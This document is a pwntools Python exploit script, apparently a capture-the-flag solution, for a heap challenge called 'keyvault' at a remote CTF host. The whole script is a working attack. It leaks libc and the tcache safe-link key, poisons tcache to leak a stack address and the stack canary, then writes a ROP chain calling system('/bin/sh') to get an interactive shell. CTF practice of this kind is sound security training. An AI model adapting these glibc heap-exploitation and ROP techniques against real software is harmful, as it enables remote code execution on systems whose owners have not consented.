from pwn import *

context.terminal = ["tmux","splitw","-h"]
exe = ELF("./keyvault")
libc = exe.libc
context.binary = exe
context.log_level = "info"
context.timeout=1

#r = process([exe.path])#,env={"LD_PRELOAD":"./libc.so.6"})
r = remote("keyvault.ctf.wales",1337)
#gdb.attach(r,gdbscript="c\n")

start =time.time()

REGEN_COUNT = 0

def create(index,size):
    r.recvuntil(b">")
    r.sendline(b"1")
    r.recvuntil(b"Slot")
    r.sendline(f"{index}".encode())
    r.sendline(b"A")
    r.sendline(f"{size}".encode())

def view(index):
    r.recvuntil(b">")
    r.sendline(b"2")
    r.recvuntil(b"Slot")
    r.sendline(f"{index}".encode())
    r.recvuntil(b"\033[32m")
    return bytes.fromhex(r.recvuntil(b"\033[0m\n",drop=True).decode())

def delete(index):
    r.recvuntil(b">")
    r.sendline(b"3")
    r.recvuntil(b"Slot")
    r.sendline(f"{index}".encode())

def regen(index,size,mode):
    r.recvuntil(b">")
    r.sendline(b"4")
    r.recvuntil(b"Slot")
    r.sendline(f"{index}".encode())
    r.recvuntil(b"length")
    r.sendline(f"{size}".encode())
    r.recvuntil(b"Mode")
    r.sendline(f"{mode}".encode())

def regen_at(index,size,mode):
    regen(index,size+1,mode)
    global REGEN_COUNT
    REGEN_COUNT += 1

def set_byte(index,offset,value):
    regen_at(index,offset,3)
    buf = view(index)
    def done(buf):
        return len(buf) == offset if value == 0 else len(buf) > offset and buf[offset] == value
    while not done(buf):
        if len(buf) <= offset:
            regen_at(index,len(buf),3)
        elif ((buf[offset] ^ value) & 0x0f) == 0:
            regen_at(index,offset,2)
        elif ((buf[offset] ^ value) & 0xf0) == 0:
            regen_at(index,offset,1)
        else:
            regen_at(index,offset,3)
        buf = view(index)

def write_val(index,payload,offset=0):
    p = log.progress(f"Writing {len(payload)} bytes to key {index}")
    done = bytearray(len(payload))
    for i,x in reversed(list(enumerate(payload))):
        set_byte(index,i+offset,x)
        done[i] = x
        p.status(done.hex())
    p.success(done.hex())

def fill_bytes(index,length): #Fill so no nullbytes
    regen(index,length,3)
    while (val:=len(view(index))) < length:
        regen_at(index,val,3)

r.recvuntil("KeyVault")
### Leak libc by placing in unsorted bin for a pointer to main_arena
for i in range(8):
    create(i,0x100)

create(8,0x100)

for i in range(8):
    delete(i)

libc_leak = u64(view(7).ljust(8,b"\x00"))
log.info(f"Found libc leak: 0x{libc_leak:x}")

main_arena_offset = 0x203ac0
libc.address = libc_leak - (main_arena_offset+96)
log.info(f"Libc base: 0x{libc.address:x}")
delete(8)



### Leak tcache safe_link
create(0,0x20)
delete(0)

safe_link = u64(view(0).ljust(8,b"\x00"))

log.info(f"Safe link key: 0x{safe_link:x}")



### Poison tcache for stack leak
create(0,0x20)
create(1,0x20) #RSP 5360 RBP 5400
create(2,0x20)
delete(2)
delete(1)

log.info(f"Overwriting tcache with environ")
write_val(0,p64(0x31)+p64((libc.symbols["environ"]-0x28)^safe_link),offset=0x28)
create(2,0x20)
create(1,0x20)

fill_bytes(1,0x28)

stack_leak = u64(view(1)[0x20+8:].ljust(8,b"\x00"))
log.info(f"Environ stack leak: 0x{stack_leak:x}")



### Poison tcache for stack cookie
stack_cookie_offset = 0xa0

create(3,0x20)
create(4,0x20)
create(5,0x20)
delete(5)
delete(4)

log.info(f"Overwriting tcache with stack address")
write_val(3,p64(0x31)+p64((stack_leak-stack_cookie_offset-0x28)^safe_link),offset=0x28)
create(5,0x20)
create(4,0x20)

fill_bytes(4,0x28+1) #Overwrite stack_cookie_nullbyte too

stack_cookie = u64(view(4)[0x28+1:0x28+8].rjust(8,b"\x00"))
log.info(f"Stack cookie: 0x{stack_cookie:x}")



### Poison tcache to write to RSP
rsp_offset = 0x148
rsp = stack_leak - rsp_offset

create(6,0x20)
create(7,0x20)
create(8,0x20)
delete(8)
delete(7)

log.info(f"RSP address: 0x{rsp:x}")
log.info(f"Overwriting tcache with RSP")
write_val(6,p64(0x31)+p64((rsp)^safe_link),offset=0x28)

create(8,0x20)
create(7,0x20)


### Write ROP chain
rops = ROP(libc,base=rsp+0x18)
rops.raw(rops.ret)
rops.system(b"/bin/sh")
log.info(rops.dump())

write_val(7,rops.chain(),offset=0x18)
write_val(7,p64(stack_cookie),offset=8)

log.info(f"TIME: {time.time()-start}")
log.info(f"Regen count: {REGEN_COUNT}")

log.info(f"Exit to get shell")
r.interactive()

